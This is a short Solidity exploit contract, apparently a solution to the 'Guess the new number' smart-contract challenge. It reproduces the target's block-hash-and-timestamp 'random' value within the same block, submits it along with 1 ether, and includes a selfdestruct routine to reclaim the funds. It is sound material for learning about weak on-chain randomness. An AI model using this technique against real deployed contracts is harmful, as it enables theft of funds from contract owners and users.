/*

a contract has to be created to call the challenge to ensure the block number is the same as in the challenge when 
calculated

attackct = TheGuessAttackContract.deploy({'from':a[0]})

attackct.attack("contractAddress",{'from':a[0]})

attackct.destroy() to get the eth back

*/


pragma solidity 0.8.6;


interface GuessTheNewNumberChallenge {

function guess(uint8 n) external payable;


}

contract TheGuessAttackContract {


function attack(address _contractAddress) external payable {

  GuessTheNewNumberChallenge  victim = GuessTheNewNumberChallenge(_contractAddress);

    victim.guess{value : 1 ether}(uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)))));


}

function destroy() external {

    selfdestruct(payable(msg.sender));
}
}